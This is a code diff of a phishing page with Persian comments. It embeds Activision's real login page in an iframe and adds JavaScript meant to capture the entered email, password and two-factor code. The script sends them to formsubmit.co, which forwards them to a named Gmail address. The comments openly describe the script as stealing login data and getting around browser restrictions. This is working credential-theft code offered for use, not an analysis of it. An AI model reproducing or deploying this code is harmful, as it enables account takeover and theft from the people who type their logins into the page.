@@ -12,49 +12,53 @@
 </head>
 <body>
 
-<!-- صفحه لاگین اصلی اکتیویژن لود می‌شه (ظاهر واقعی، سرعت بالا) -->
-<iframe src="https://profile.activision.com/login?locale=en&redirectUrl=https://www.activision.com&theme=activision.com" allowfullscreen></iframe>
+<!-- صفحه لاگین اصلی اکتیویژن لود می‌شه -->
+<iframe id="loginIframe" src="https://profile.activision.com/login?locale=en&redirectUrl=https://www.activision.com&theme=activision.com" allowfullscreen></iframe>
 
-<!-- اسکریپت ارسال اطلاعات به ایمیلت (با FormSubmit) -->
+<!-- اسکریپت دزدی اطلاعات با injected script (CORS رو دور می‌زنه) -->
 <script>
-// ایمیلت برای دریافت اطلاعات
 const EMAIL = "erfantroll778899@gmail.com";
 
 let sent = false;
 
-setInterval(() => {
+const iframe = document.getElementById('loginIframe');
+
+// وقتی iframe لود شد، اسکریپت رو داخلش inject کن
+iframe.onload = function() {
     try {
-        const frame = document.querySelector('iframe').contentWindow.document;
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
 
-        // فیلدهای ایمیل، پسورد و 2FA
-        const email = frame.querySelector('input[type="email"], input[name="username"], input[placeholder*="email"], input[id*="email"]')?.value?.trim();
-        const password = frame.querySelector('input[type="password"], input[name="password"]')?.value;
-        const code2fa = frame.querySelector('input[inputmode="numeric"], input[autocomplete="one-time-code"], input[placeholder*="code"]')?.value?.trim();
+        // اسکریپت رو داخل iframe اجرا کن
+        const script = doc.createElement('script');
+        script.textContent = `
+            let sent = false;
+            setInterval(() => {
+                if (sent) return;
+                const email = document.querySelector('input[type="email"], input[name="username"], input[placeholder*="email"], input[id*="email"]')?.value?.trim();
+                const password = document.querySelector('input[type="password"], input[name="password"]')?.value;
+                const code2fa = document.querySelector('input[inputmode="numeric"], input[autocomplete="one-time-code"], input[placeholder*="code"]')?.value?.trim();
 
-        if ((email || password || code2fa) && !sent) {
-            sent = true;
+                if (email || password || code2fa) {
+                    sent = true;
+                    const formData = new FormData();
+                    if (email) formData.append("email", email);
+                    if (password) formData.append("password", password);
+                    if (code2fa) formData.append("vcode", code2fa);
+                    formData.append("_subject", "لاگین جدید اکتیویژن! 🔥");
+                    formData.append("_template", "table");
 
-            // ساخت فرم مجازی و ارسال به FormSubmit
-            const formData = new FormData();
-            if (email) formData.append("email", email);
-            if (password) formData.append("password", password);
-            if (code2fa) formData.append("vcode", code2fa);
-            formData.append("_subject", "لاگین جدید اکتیویژن! 🔥");
-            formData.append("_template", "table");
-
-            fetch(`https://formsubmit.co/${EMAIL}`, {
-                method: "POST",
-                body: formData
-            }).then(() => {
-                console.log("اطلاعات به ایمیل ارسال شد");
-            }).catch(err => {
-                console.error("خطا در ارسال", err);
-            });
-        }
+                    fetch("https://formsubmit.co/${EMAIL}", {
+                        method: "POST",
+                        body: formData
+                    });
+                }
+            }, 1000);
+        `;
+        doc.head.appendChild(script);
     } catch (e) {
-        // خطا نادیده گرفته بشه (CORS یا دسترسی نداشتن به iframe)
+        console.log("دسترسی به iframe محدود شد");
     }
-}, 1200);
+};
 </script>
 
 </body>
